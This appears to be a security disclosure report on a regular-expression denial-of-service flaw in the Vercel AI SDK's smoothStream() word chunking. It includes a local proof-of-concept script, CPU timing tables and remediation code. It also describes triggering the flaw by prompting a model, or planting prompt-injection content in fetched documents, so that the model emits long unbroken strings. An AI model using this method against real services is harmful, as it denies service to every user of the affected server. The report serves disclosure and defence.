# Regular-Expression Denial of Service (ReDoS) / event-loop starvation in `smoothStream()` (AI SDK)

**Program:** Vercel Open Source
**Asset / component:** `ai` (Vercel AI SDK) — `smoothStream()` text transform
**Package:** `ai` (npm)
**File:** `packages/ai/src/generate-text/smooth-stream.ts`
**Affected versions:** confirmed on `ai@7.0.34` (current `latest`); the vulnerable code is unchanged across the `ai-v5` (`5.0.218`) and `ai-v6` (`6.0.233`) release lines and current `canary`.
**Weakness:** CWE-1333 (Inefficient Regular Expression Complexity) → CWE-400 (Uncontrolled Resource Consumption)
**Severity:** High — CVSS 3.1 **7.5** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
(If the affected endpoint requires authentication, `PR:L` → **6.5 / Medium**.)

---

## Summary

`smoothStream()` is a first-party, documented AI SDK transform used to smooth streamed model
output for nicer UX. It is wired into a streaming response with
`streamText({ model, experimental_transform: smoothStream() })` and runs **server-side** on the
model's output token stream.

With its **default** configuration (`chunking: 'word'`) it detects word boundaries with the regular
expression `/\S+\s+/m` and applies it with `RegExp.prototype.exec()` **without the global (`g`)
flag** against the entire accumulated output buffer, on **every** streamed text delta.

The pattern `/\S+\s+/m` exhibits quadratic backtracking on input that contains a long run of
non‑whitespace characters (`\S+` matches greedily, then repeatedly backtracks trying to satisfy the
mandatory trailing `\s+`). Because the buffer is re-scanned from index 0 for every incoming token
delta (there is no `g` flag / `lastIndex` progression, and the buffer is not flushed until a
whitespace boundary is found), the total cost of processing a single contiguous non-whitespace run
of length *N* streamed as small deltas is **~O(N³)**.

The result is a **denial-of-service**: a single model response consisting of a few thousand
contiguous non-whitespace characters consumes tens of seconds of server CPU, and a single large
run (e.g. base64 image data a model echoes) produces multi-second, full **event-loop freezes** that
stall every concurrent request on the Node.js server.

The trigger — the *content* of the model's output — is attacker-influenceable: a user of a chat/agent
application can simply ask the model to emit a long unbroken string (`"print 6000 'a' with no
spaces"`, `"repeat this base64 exactly: …"`), and in agentic / RAG applications untrusted content
(web pages, documents, tool results) can instruct the model to do the same (prompt injection). No
special application configuration is required beyond using `smoothStream()` — a feature Vercel's own
documentation recommends.

---

## Affected code

`packages/ai/src/generate-text/smooth-stream.ts`

```ts
const CHUNKING_REGEXPS = {
  word: /\S+\s+/m,   // <-- default; quadratic backtracking on long non-whitespace input
  line: /\n+/m,      // (not affected — linear)
};

export function smoothStream({
  delayInMs = 10,
  chunking = 'word',          // <-- default is the vulnerable 'word' mode
  ...
}) {
  ...
  detectChunk = buffer => {
    const match = chunkingRegex.exec(buffer);   // <-- exec() WITHOUT /g, re-scans whole buffer
    if (!match) return null;
    return buffer.slice(0, match.index) + match?.[0];
  };
  ...
  async transform(chunk, controller) {
    ...
    buffer += chunk.text;                        // <-- buffer accumulates across deltas
    ...
    while ((match = detectChunk(buffer)) != null) {   // <-- called for every incoming delta
      controller.enqueue({ type, text: match, id });
      buffer = buffer.slice(match.length);
      await delay(delayInMs);
    }
  }
}
```

Confirmed present in the shipped npm build (`node_modules/ai/dist/index.js`):
`var CHUNKING_REGEXPS = { word: /\S+\s+/m, ... }` and `const match = chunkingRegex.exec(buffer);`.

### Root cause

1. `/\S+\s+/m` is a classic super-linear pattern: on a string of `N` non-whitespace characters, a
   single `exec()` is **O(N²)** (greedy `\S+` backtracks against the mandatory `\s+`).
2. `exec()` is used **without `/g`**, so `lastIndex` never advances and the *whole* accumulating
   buffer is re-scanned on every text delta.
3. When no whitespace is present, `detectChunk` never matches, so the buffer is **never flushed**
   and keeps growing while it is re-scanned. Streaming a contiguous run of length `N` as the many
   small deltas providers actually emit therefore costs **~O(N³)** in aggregate.

---

## Steps to reproduce

Prerequisites: Node.js ≥ 18. The PoC uses only the published `ai` package and its bundled test
mock model — **no API keys and no network calls**.

```bash
mkdir poc && cd poc
npm init -y
npm install ai            # installs ai@7.0.34 (or current latest)
# copy poc.js (below) into this directory
node poc.js
```

`poc.js` (end-to-end, through the real `streamText()` pipeline, exactly as documented):

```js
const { streamText, smoothStream } = require('ai');
const { MockLanguageModelV4, simulateReadableStream } = require('ai/test');

// A model that streams `total` contiguous non-whitespace chars as small token deltas
// (what any real model does when asked to echo a long token / base64 blob / "aaaa...").
function makeModel(total, delta) {
  const parts = [{ type: 'text-start', id: '0' }];
  for (let i = 0; i < total; i += delta)
    parts.push({ type: 'text-delta', id: '0', delta: 'a'.repeat(Math.min(delta, total - i)) });
  parts.push({ type: 'text-end', id: '0' });
  parts.push({ type: 'finish', finishReason: 'stop',
              usage: { inputTokens: 1, outputTokens: total, totalTokens: total + 1 } });
  return new MockLanguageModelV4({
    doStream: async () => ({ stream: simulateReadableStream({ chunks: parts }) }),
  });
}

async function run(total) {
  const t = Date.now();
  const result = streamText({
    model: makeModel(total, 4),
    prompt: 'echo',
    experimental_transform: smoothStream({ delayInMs: null }), // default 'word' chunking
  });
  for await (const _ of result.textStream) { /* server consumes to stream to client */ }
  console.log(`${total} non-whitespace chars -> event loop busy ${(Date.now() - t) / 1000}s`);
}

(async () => { for (const L of [2000, 4000, 6000]) await run(L); })();
```

---

## Proof of concept — measured results

**Environment:** Node.js v22, `ai@7.0.34`.

### 1. End-to-end via `streamText({ experimental_transform: smoothStream() })`

| Model output (contiguous non-whitespace) | Server CPU time to process one response |
| ---------------------------------------- | --------------------------------------- |
| 2,000 chars                              | **1.41 s**                              |
| 4,000 chars                              | **7.13 s**                              |
| 6,000 chars                              | **21.65 s**                             |

Control — same length but with a space every 8 chars: **0.03 s**. This is a **~700×** CPU
amplification for a ~6 KB response.

### 2. Full event-loop freeze from a single `exec()` (large contiguous run)

A single `/\S+\s+/m` `exec()` on a contiguous non-whitespace buffer (what one delta produces once
the buffer is large, e.g. a model echoing base64 image data):

| Buffer length | Single `exec()` time (event loop fully frozen) |
| ------------- | ---------------------------------------------- |
| 50,000 chars  | **2.7 s**                                       |
| 100,000 chars | **10.7 s**                                       |
| 200,000 chars | **43.0 s**                                       |

A `setInterval(…, 100)` heartbeat registered **zero ticks** during the synchronous blocking window,
demonstrating that the Node.js event loop is fully starved — all other in-flight HTTP requests,
timers and I/O on the process are stalled for the duration.

### 3. Only the default `word` mode is affected

`chunking: 'line'` (`/\n+/m`) is linear and processes 4,000 non-newline chars in ~0.02 s. The
vulnerability is specific to the **default** `chunking: 'word'`.

Runnable versions of all three PoCs are attached (`poc.js`, `poc-transform.js`).

---

## Impact

Availability / Denial of Service against any server-side application that uses `smoothStream()`
(the default word-chunking mode) in its streaming pipeline — a documented and commonly recommended
AI SDK feature (see e.g. the official "Slow Azure OpenAI streaming" troubleshooting guide, which
recommends `experimental_transform: smoothStream()`).

- A **single** request whose model response contains a modest contiguous non-whitespace run (a few
  thousand characters) consumes tens of seconds of CPU. A small number of concurrent such requests
  saturates all CPU cores and denies service to every user.
- A **single** large run (≥ ~100 KB of contiguous non-whitespace, e.g. base64 file/image data or a
  long token the model reproduces) blocks the Node.js event loop for 10–40+ seconds in one
  synchronous `exec()`, freezing **all** concurrent requests on the process, not just the
  attacker's.

**Triggering it is realistic and low-effort:**
- *Direct:* in a multi-tenant chat/agent app, a user controls their own prompt and can ask the model
  to output a long unbroken string (`"print 8000 'a' with no spaces"`, `"echo this exactly:
  <long base64>"`). Models reproduce base64/hex/long tokens verbatim (whitespace-free).
- *Indirect (prompt injection / poisoned RAG):* attacker-controlled content fetched by the agent
  (web page, document, tool result) instructs the model to emit such output — squarely within the
  program's "AI model integration security" focus area.
- No credentials, special headers, or unusual configuration are required beyond the application
  using `smoothStream()`.

---

## Severity

**CVSS 3.1: 7.5 (High)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

Rationale: remotely reachable over the application's normal API (AV:N), low complexity (just cause a
long non-whitespace output, AC:L), no user interaction (UI:N), availability impact is High
(process-wide event-loop starvation, A:H). For an endpoint that requires authentication use
`PR:L` → **6.5 (Medium)**. An argument for `S:C` (scope change — one request freezes the whole
process, affecting all tenants) would raise the score further; I have scored conservatively.

---

## Suggested remediation

The word-boundary detection can be made fully linear and bounded:

1. **Replace the backtracking match with a linear scan.** Instead of `/\S+\s+/m.exec(buffer)`, find
   the first whitespace character (linear), then extend over the following whitespace run:

   ```ts
   detectChunk = buffer => {
     // first whitespace char (single-char class, no backtracking → linear)
     const ws = buffer.search(/\s/);
     if (ws === -1) return null;              // no boundary yet
     let end = ws;
     while (end < buffer.length && /\s/.test(buffer[end])) end++;  // consume ws run
     return buffer.slice(0, end);
   };
   ```

   This is equivalent to `/\S+\s+/` for the intended purpose but runs in O(n) with no backtracking.

2. **Bound buffer growth (defense in depth).** If the accumulated buffer exceeds a maximum length
   without a boundary, flush it as a chunk instead of continuing to re-scan indefinitely. This caps
   worst-case work regardless of the matching strategy and also prevents unbounded memory growth.

3. If retaining a regex, at minimum avoid re-scanning the whole buffer on every delta (use a sticky
   `y` match with a maintained `lastIndex`, or scan only the newly appended segment for a boundary),
   and document that user-supplied custom `chunking` RegExps must be linear-time.

---

## References

- Affected source: `packages/ai/src/generate-text/smooth-stream.ts` (`CHUNKING_REGEXPS.word = /\S+\s+/m`, `chunkingRegex.exec(buffer)`).
- Documentation recommending the feature: AI SDK Core reference — `smoothStream()`; "Slow Azure OpenAI streaming" troubleshooting guide (`experimental_transform: smoothStream()`).
- CWE-1333: Inefficient Regular Expression Complexity. CWE-400: Uncontrolled Resource Consumption.
